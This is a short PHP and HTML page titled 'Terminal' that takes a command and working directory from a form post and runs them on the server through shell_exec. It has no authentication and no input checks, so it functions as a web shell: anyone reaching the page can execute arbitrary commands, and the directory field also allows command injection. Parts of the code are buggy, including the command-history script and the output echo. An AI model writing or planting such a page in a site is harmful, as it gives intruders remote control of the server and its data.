<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta content="utf-8" http-equiv="encoding">
	<meta charset="utf-8"/>
	<title>Terminal</title>
</head>
<body>
	<?php
	if(isset($_POST['cmd'])){
		//Get command execute and return.
	  $command = $_POST['cmd'];
		$cwd = $_POST['cwd'];
		echo "cwd:".$cwd."<br>";
		echo "command:".$command."<br>";
	  $output = trim(shell_exec("cd $cwd && ".$command.' 2>&1 && pwd || pwd'));
	  $output = trim($output);
		if (stripos($command, "cd") or ($command[0] == 'c' and $command[1] == 'd')) {
			$cwd = $output;
		}else{
			$cwd = substr($output, strrpos($output, "\n")+1);
			$output = substr($output, 0, (strlen($output) - strlen($cwd)));
		}
	  $response = array('output' => $output);
	} else {
		//Initial state
	  $cwd = trim(shell_exec("pwd"));
		$previous_commands = array();
	}
	?>
	<div class="content">
		<form id="shell_form" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" onkeydown="onCmdKeyDown(event)">
			<div>
				<h6 style="float: left; overflow: auto;">
				<?php echo $cwd; ?>
				</h6>
				<input id="shell-cwd" type="hidden" name="cwd" value="<?php echo $cwd; ?>"/>
      	<input id="shell-cmd" type="text" name="cmd"/>
				<div>
					<p>
						<?php
						if($response != NULL){
							echo $response."<br>";
						}
						?>
					</p>
				</div>
			</div>
		</form>
	</div>
	<script type="text/javascript">


		var previous_commands = [];

		var current_command_index = 0;

		//helpers
		//tried to implement the historic but couldn't make it work;
		function onCmdKeyDown(event){

			var key_code = event.keyCode;
			if (key_code == 38) { //Up arrow

				previous_command();
			} else if (key_code == 40) { //Down arrow

				next_command();
			} else if (key_code == 9) { //Tab

			} else if (key_code == 13) { //Enter

				if (event.shiftKey) {
					var command = document.getElementById('shell-cmd');

					previous_commands.push(command.value);
					current_command_index ++;
					document.getElementById('shell_form').submit();
					return false;
				}
			}
			return true;
		}

		function previous_command(){
			current_command_index--;
			if (current_command_index < 0) {
				current_command_index = 0;
				return;
			}
			document.getElementById('shell-cmd').value = previous_commands[current_command_index];
		}

		function next_command(){
			current_command_index++;
			if (current_command_index >= previous_commands.length) {
				current_command_index = previous_commands.length - 1;
				return;
			}
			document.getElementById('shell-cmd').value = previous_commands[current_command_index];
		}


	</script>


</body>
